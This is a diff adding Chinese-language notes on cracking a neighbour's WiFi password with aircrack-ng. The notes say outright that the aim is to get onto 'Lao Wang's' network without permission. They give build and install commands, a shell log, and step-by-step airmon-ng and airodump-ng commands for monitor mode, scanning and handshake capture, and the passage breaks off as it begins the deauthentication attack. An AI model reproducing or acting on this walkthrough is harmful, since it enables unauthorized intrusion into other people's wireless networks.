@@ -67,3 +67,50 @@ wireshark左上角，查找list那个按钮
 	登录获取某网站的表单，分析其账号和密码
 	
 ##WIFI密码破解原理剖析
+	1、把我的网卡变成监听模式(捕获无线信号)
+	2、扫描周围无线WIFI
+	3、专门监听老王的WIFI（老王和路由器的数据传输）
+	4、发起攻击，模拟WIFI路由器单插，向老王发出断开连接请求
+	5、老王的电脑断开连接，自动重新建立连接，咱们捕获4次握手包
+	6、4次握手包里包含有经过加密的密码，SHA1 MD5
+	7、暴力破解，穷举字典破解
+	8、轻松加愉快上老王家的网
+
+##Aircrack-ng
+###下载
+	http://www.aircrack-ng.org/
+	http://www.aircrack-ng.org/downloads.html
+	http://download.aircrack-ng.org/aircrack-ng-1.2-rc4.tar.gz
+	
+###安装
+	sudo apt-get install build-essential libssl-dev pkg-config libnl-3-dev libnl-genl-3-dev
+	tar zxvf aircrack-ng-1.2-rc2.tar.gz
+	cd aircrack-ng-1.2-rc2
+	make
+	sudo make install
+	
+安装步骤：
+		
+	ljaer@ubuntu:~$ mkdir mingmingMM	ljaer@ubuntu:~$ cd mingmingMM/	ljaer@ubuntu:~/mingmingMM$ ls	ljaer@ubuntu:~/mingmingMM$ wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc4.tar.gz	ljaer@ubuntu:~/mingmingMM$ ls	aircrack-ng-1.2-rc4.tar.gz	ljaer@ubuntu:~/mingmingMM$ tar zxvf aircrack-ng-1.2-rc4.tar.gz	ljaer@ubuntu:~/mingmingMM$ ls	aircrack-ng-1.2-rc4  aircrack-ng-1.2-rc4.tar.gz	ljaer@ubuntu:~/mingmingMM$ cd aircrack-ng-1.2-rc4/	ljaer@ubuntu:~/mingmingMM/aircrack-ng-1.2-rc4$ ls	apparmor  ChangeLog   INSTALLING  LICENSE.OpenSSL  packages  scripts  VERSION	AUTHORS   common.mak  lib         Makefile         patches   src	autocfg   evalrev     LICENSE     manpages         README    test	ljaer@ubuntu:~/mingmingMM/aircrack-ng-1.2-rc4$ sudo apt-get install build-essential libssl-dev pkg-config libnl-3-dev libnl-genl-3-dev 	ljaer@ubuntu:~/mingmingMM/aircrack-ng-1.2-rc4$ make	ljaer@ubuntu:~/mingmingMM/aircrack-ng-1.2-rc4$ sudo make install	ljaer@ubuntu:~/mingmingMM/aircrack-ng-1.2-rc4$ cd ..	ljaer@ubuntu:~/mingmingMM$ ls	aircrack-ng-1.2-rc4  aircrack-ng-1.2-rc4.tar.gz	ljaer@ubuntu:~/mingmingMM$ mkdir crack	ljaer@ubuntu:~/mingmingMM$ cd crack/	ljaer@ubuntu:~/mingmingMM/crack$ ls	ljaer@ubuntu:~/mingmingMM/crack$ pwd	/home/ljaer/mingmingMM/crack
+	
+	
+##WIFI密码破解
+1、查看本机电脑无线网卡
+	
+	iwconfig或者ifconfig
+	在这里由于使用的是虚拟机（可以在虚拟机的网络设置，设置wifi连接eth0）
+
+2、激活网卡到monitor模式，得到监控模式下的设备名为wlan0mon
+	
+	sudo airmon-ng start wlan0
+	
+3、探查无线网络，选取破解路由器对象
+
+	sudo airodump-ng wlan0mon
+	
+4、设置监控频道，抓取被选定路由器的数据包，始终运行
+	
+	sudo airodump-ng --ivs -w linuxcpp -c 6 wlan0mon
+	捕获的包存入linuxcp-0x.ivs文件，x为序号
+	
+5、新开终端，发起Deauth攻击，破事客户端重新链接路由器
